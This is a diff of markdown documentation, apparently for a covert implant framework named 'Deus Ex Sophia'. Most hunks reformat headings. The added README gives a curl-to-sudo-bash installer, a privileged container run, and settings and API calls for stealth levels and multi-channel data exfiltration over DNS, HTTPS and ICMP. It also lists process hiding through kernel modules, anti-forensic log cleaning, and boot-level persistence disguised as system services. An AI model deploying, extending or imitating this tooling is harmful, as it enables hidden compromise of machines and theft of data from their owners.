@@ -1,5 +1,6 @@
-1. **Complete Dockerfile** with multi-stage build
-2. **Python requirements** with all dependencies
+**Complete Dockerfile** with multi-stage build
+
+1. **Python requirements** with all dependencies
 3. **Intelligent entrypoint** with auto-initialization
 4. **Initialization script** for first-run setup
 5. **Docker Compose** for microservices architecture
@@ -8,6 +9,8 @@
 8. **Helm chart** for production packaging
 9. **Private registry setup** for secure distribution
 10. **One-command deploy** for instant transcendence
+
+---
 
 ```
 /opt/sysaux/                           # Main operational directory
@@ -72,7 +75,7 @@
 /etc/initramfs-tools/scripts/init-premount/systemd-helper # Boot persistence
 ```
 
-### **1. Main Dockerfile (Full System)**
+### **1\. Main Dockerfile (Full System)**
 
 ```dockerfile
 # Deus Ex Sophia - Full Ascension System v5.0
@@ -301,7 +304,7 @@ CMD ["ascend", "dashboard"]
 
 ---
 
-### **2. Requirements File**==============================================================
+### **2\. Requirements File**
 
 ```txt
 # requirements.txt
@@ -388,7 +391,7 @@ pre-commit>=3.3.0
 
 ---
 
-### **3. Entrypoint Script**============================================================================================
+### **3\. Entrypoint Script**
 
 ```bash
 #!/bin/bash
@@ -706,7 +709,7 @@ main "$@"
 
 ---
 
-### **4. Initialization Script**========================================================================================
+### **4\. Initialization Script**
 
 ```bash
 #!/bin/bash
@@ -825,7 +828,7 @@ echo "[*] System ready. Use 'ascend' to interact with the system."
 
 ---
 
-### **5. Docker Compose (Microservices)**==========================================================================================
+### **5\. Docker Compose (Microservices)**
 
 ```yaml
 # docker-compose.yml
@@ -1030,7 +1033,7 @@ secrets:
 
 ---
 
-### **6. Build Script**=========================================================================================================
+### **6\. Docker Build Script**
 
 ```bash
 #!/bin/bash
@@ -1357,7 +1360,7 @@ main "$@"
 
 ---
 
-### **7. Kubernetes Manifests**====================================================================================================
+### **7\. Kubernetes Manifests**
 
 ```yaml
 # kubernetes/namespace.yaml
@@ -1600,7 +1603,7 @@ spec:
 
 ---
 
-### **8. Helm Chart**===========================================================================================================
+### **8\. Helm Chart**
 
 ```yaml
 # helm/sophia/Chart.yaml
@@ -1825,7 +1828,7 @@ autoscaling:
 
 ---
 
-### **9. Docker Registry Setup Script**========================================================================================================
+### **9\. Docker Registry Setup Script**
 
 ```bash
 #!/bin/bash
@@ -1953,7 +1956,7 @@ echo "To push images: ./push-images.sh"
 
 ---
 
-### **10. Quick Deploy Script (One-Liner)**=======================================================================================================================
+### **10\. Quick Deploy Script (One-Liner)**
 
 ```bash
 #!/bin/bash
@@ -2036,4 +2039,384 @@ echo ""
 echo "[✓] Deus Ex Sophia is now active."
 ```
 
+## 🚀 Quick Start
+
+### Bare Metal Installation
+
+```bash
+# 1. Clone or create installation script
+curl -sL https://raw.githubusercontent.com/deus-ex-sophia/ascension/main/install.sh -o install.sh
+
+# 2. Make executable and run
+chmod +x install.sh
+sudo ./install.sh
+
+# 3. OR run directly
+sudo bash -c "$(curl -fsSL https://raw.githubusercontent.com/deus-ex-sophia/ascension/main/install.sh)"
+
+# 4. Initialize system
+sudo ascend --init
+
+# 5. Start services
+sudo systemctl start systemd-networkd-helper
+sudo systemctl start network-oracle
+sudo systemctl start matrix-orchestrator
+```
+
+### Docker Quick Deploy
+
+```bash
+# Single command deployment
+docker run -d \
+  --name deus-ex-sophia \
+  --restart unless-stopped \
+  --privileged \
+  --cap-add=NET_ADMIN \
+  --cap-add=NET_RAW \
+  --cap-add=SYS_ADMIN \
+  -p 8080:8080 \
+  -p 53:53/udp \
+  -p 53:53/tcp \
+  -v sophia_data:/opt/sysaux \
+  -v /etc/systemd/system:/host_systemd:ro \
+  deus-ex-sophia/full:5.0
+
+# Access dashboard
+xdg-open http://localhost:8080
+```
+
+## 🔧 Configuration
+
+### Environment Variables
+
+```bash
+# Core settings
+export SOPHIA_ENV="production"
+export SOPHIA_STEALTH_LEVEL="9"
+export SOPHIA_ENCRYPTION_EPOCH="hourly"
+export SOPHIA_EXFIL_INTERVAL="300"
+
+# Network settings
+export SOPHIA_NETWORK_MONITOR="all"
+export SOPHIA_SCAN_INTENSITY="5"
+export SOPHIA_THREAT_UPDATE="3600"
+
+# Exfiltration settings
+export SOPHIA_EXFIL_CHANNELS="dns,https,icmp"
+export SOPHIA_DEAD_DROP_ENABLED="true"
+export SOPHIA_STEGANOGRAPHY_ENABLED="false"
+
+# Security settings
+export SOPHIA_KEY_ROTATION="enabled"
+export SOPHIA_TAMPER_DETECTION="enabled"
+export SOPHIA_SELF_REPAIR="enabled"
+```
+
+### Configuration Files
+
+- `/opt/sysaux/config/core.json` - Core system configuration
+- `/opt/sysaux/.network/config/intensity.conf` - Scan intensity
+- `/opt/sysaux/.network/config/interface.conf` - Monitoring interfaces
+- `/opt/sysaux/.matrix/config/channels.json` - Exfiltration channels
+- `/opt/sysaux/.matrix/config/encryption.json` - Encryption settings
+
+## 📊 Monitoring & Management
+
+### Command Line Interface
+
+```bash
+# System control
+ascend status                    # Overall system status
+ascend start                     # Start all services
+ascend stop                      # Stop all services
+ascend restart                   # Restart system
+ascend logs                      # View system logs
+ascend backup                    # Create backup
+ascend restore <backup>          # Restore from backup
+ascend uninstall                 # Remove system (requires confirmation)
+
+# Network intelligence
+network_oracle                   # Interactive network suite
+network_oracle dashboard         # Real-time dashboard
+network_oracle passive status    # Passive monitoring status
+network_oracle active scan       # Network scan
+network_oracle threat report     # Threat intelligence report
+
+# Exfiltration matrix
+matrix_orchestrator              # Interactive matrix control
+matrix_orchestrator dashboard    # Exfiltration dashboard
+matrix_orchestrator quantum status  # Encryption status
+matrix_orchestrator payload generate  # Create payload
+matrix_orchestrator pipeline     # Full exfiltration pipeline
+```
+
+### Web Dashboard
+
+- **URL**: `http://localhost:8080` or `https://localhost:8443`
+- **Features**:
+  - Real-time system monitoring
+  - Network intelligence visualization
+  - Exfiltration status and controls
+  - Threat intelligence feeds
+  - Log viewer and analyzer
+  - Configuration management
+
+### API Endpoints (REST)
+
+```bash
+# System API
+GET  /api/v1/status              # System status
+GET  /api/v1/health             # Health check
+POST /api/v1/backup             # Create backup
+POST /api/v1/restore            # Restore backup
+
+# Network API
+GET  /api/v1/network/hosts      # Discovered hosts
+GET  /api/v1/network/scan       # Scan results
+POST /api/v1/network/scan       # Initiate scan
+GET  /api/v1/network/threats    # Threat intelligence
+
+# Exfiltration API
+POST /api/v1/exfil/payload      # Create payload
+POST /api/v1/exfil/send         # Send payload
+GET  /api/v1/exfil/status       # Exfiltration status
+GET  /api/v1/exfil/logs         # Exfiltration logs
+```
+
+## 🔒 Security Features
+
+### Encryption
+
+- **Quantum-resistant**: X25519 key exchange with ChaCha20-Poly1305
+- **Forward secrecy**: Hourly key rotation with HKDF derivation
+- **Deniable encryption**: Multiple plausible payload layers
+- **Key management**: Encrypted key storage with tamper detection
+
+### Stealth
+
+- **Process hiding**: Multiple techniques including LKM and namespace hiding
+- **Traffic normalization**: Legitimate-looking network patterns
+- **Anti-forensics**: Log cleaning and trace removal
+- **Plausible deniability**: Legitimate-appearing system functions
+
+### Persistence
+
+- **Multi-layer**: systemd, cron, profile, initramfs, kernel
+- **Self-repair**: Automatic detection and restoration
+- **Tamper detection**: Hash-based file integrity monitoring
+- **Rollback capability**: Snapshot-based recovery system
+
+## 📈 Phases Overview
+
+### Phase 1: Environment Sanitization
+
+- Root privilege verification
+- System update and bloat removal
+- Secure kernel parameter configuration
+- Telemetry and reporting removal
+
+### Phase 2: Core Installation with Truth
+
+- Hidden directory structure creation
+- Essential tool compilation from source
+- Enhanced core truth module with quantum encryption
+- Adaptive beaconing and monitoring
+
+### Phase 3: Multi-Vector Persistence Engine
+
+- Stealth systemd service integration
+- Hidden cron job installation
+- Shell profile modifications
+- SSH stealth configuration
+- Initramfs boot persistence
+- Intelligent network rules
+- Process hiding techniques
+- Backup and resilience system
+
+### Phase 4: Network Intelligence Expansion
+
+- Passive network monitoring (raw sockets)
+- Active reconnaissance with stealth scanning
+- Threat intelligence with local database
+- Real-time dashboard and visualization
+- Data export and reporting
+
+### Phase 5: Advanced Exfiltration Matrix
+
+- Quantum encryption layer
+- Multi-channel exfiltration (DNS, HTTPS, ICMP, SMTP, SSH)
+- Payload generation factory (10+ types)
+- Stealth delivery handlers (dead drops, covert channels, steganography)
+- Matrix orchestrator with unified control
+
+## 🚨 Migration & Upgrades
+
+### Version Migration
+
+```bash
+# Backup current installation
+sudo ascend backup --full
+
+# Extract migration script
+sudo tar -xzf sophia-migration-5.0.tar.gz -C /tmp
+
+# Run migration
+sudo /tmp/migrate.sh --from 4.0 --to 5.0
+
+# Verify migration
+sudo ascend verify --migration
+
+# Rollback if needed
+sudo ascend restore /opt/sysaux/backups/pre-migration.tar.gz
+```
+
+### Data Migration
+
+```bash
+# Export data from old system
+sudo network_oracle export --format json --output /tmp/network_data.json
+sudo matrix_orchestrator export --output /tmp/matrix_data.tar
+
+# Import to new system
+sudo network_oracle import --file /tmp/network_data.json
+sudo matrix_orchestrator import --file /tmp/matrix_data.tar
+
+# Verify import
+sudo network_oracle status
+sudo matrix_orchestrator status
+```
+
+### Configuration Migration
+
+```bash
+# Export configuration
+sudo ascend config export --output /tmp/sophia_config.tar
+
+# Import configuration (on new system)
+sudo ascend config import --file /tmp/sophia_config.tar
+
+# Apply configuration
+sudo ascend config apply
+```
+
+## 🛠️ Troubleshooting
+
+### Common Issues
+
+1. **Permission Denied**
+
+```bash
+sudo chmod -R 700 /opt/sysaux
+sudo chown -R root:root /opt/sysaux
+```
+
+2. **Service Not Starting**
+
+```bash
+sudo systemctl daemon-reload
+sudo systemctl restart systemd-networkd-helper
+journalctl -u systemd-networkd-helper -f
+```
+
+3. **Network Monitoring Issues**
+
+```bash
+# Check interfaces
+ip link show
+sudo network_oracle status
+
+# Check raw socket permissions
+getcap /opt/sysaux/bin/* 2>/dev/null
+```
+
+4. **Encryption Problems**
+
+```bash
+# Regenerate keys
+sudo rm -rf /opt/sysaux/.matrix/keys/*
+sudo matrix_orchestrator quantum start --force
+
+# Verify encryption
+sudo matrix_orchestrator quantum test
+```
+
+### Logs Location
+
+- System logs: `/opt/sysaux/logs/`
+- Network intelligence: `/opt/sysaux/.network/logs/`
+- Exfiltration: `/opt/sysaux/.matrix/exfil/`
+- Systemd: `journalctl -u systemd-networkd-helper`
+- Kernel: `dmesg | grep -i sophia`
+
+### Debug Mode
+
+```bash
+# Enable debug logging
+export SOPHIA_DEBUG="true"
+export SOPHIA_LOG_LEVEL="debug"
+
+# Run with verbose output
+ascend --verbose --debug
+network_oracle --verbose
+matrix_orchestrator --verbose
+```
+
+## 📚 API Documentation
+
+### REST API
+
+Full OpenAPI 3.0 specification available at `/api/v1/docs` when dashboard is running.
+
+### Python SDK
+
+```python
+from sophia_sdk import SophiaClient
+
+# Initialize client
+client = SophiaClient(
+    base_url="http://localhost:8080",
+    api_key="your_api_key"
+)
+
+# System operations
+status = client.get_status()
+health = client.get_health()
+backup = client.create_backup()
+
+# Network operations
+hosts = client.get_network_hosts()
+scan = client.start_network_scan("192.168.1.0/24")
+threats = client.get_threat_intel()
+
+# Exfiltration operations
+payload = client.create_payload("system_info")
+result = client.exfiltrate(payload, channel="dns")
+logs = client.get_exfil_logs()
+```
+
 ---
+
+### **WebSocket API**
+
+```javascript
+// Real-time updates
+const ws = new WebSocket('ws://localhost:8080/ws');
+
+ws.onmessage = (event) => {
+    const data = JSON.parse(event.data);
+  
+    switch(data.type) {
+        case 'system_status':
+            updateSystemStatus(data.payload);
+            break;
+        case 'network_update':
+            updateNetworkMap(data.payload);
+            break;
+        case 'exfil_status':
+            updateExfilStatus(data.payload);
+            break;
+    }
+};
+```
+
+&nbsp;
